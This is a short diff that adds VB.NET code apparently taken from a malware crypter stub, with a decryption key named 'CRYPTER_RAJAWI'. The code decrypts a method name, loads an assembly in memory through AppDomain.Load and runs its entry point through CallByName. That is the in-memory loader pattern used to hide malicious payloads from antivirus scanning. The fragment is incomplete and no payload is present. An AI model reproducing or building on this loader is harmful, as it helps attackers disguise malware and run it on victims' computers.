@@ -1,0 +1,3 @@
+﻿Dim rca1 As String = DeCrypt("Ñ0Ž¯„", "CRYPTER_RAJAWI")
+        Dim rca2 As System.Object = System.AppDomain.CurrentDomain.Load("R4Jaw!").EntryPoint
+        CallByName(rca2, rca1, CallType.Method, Nothing, Nothing)
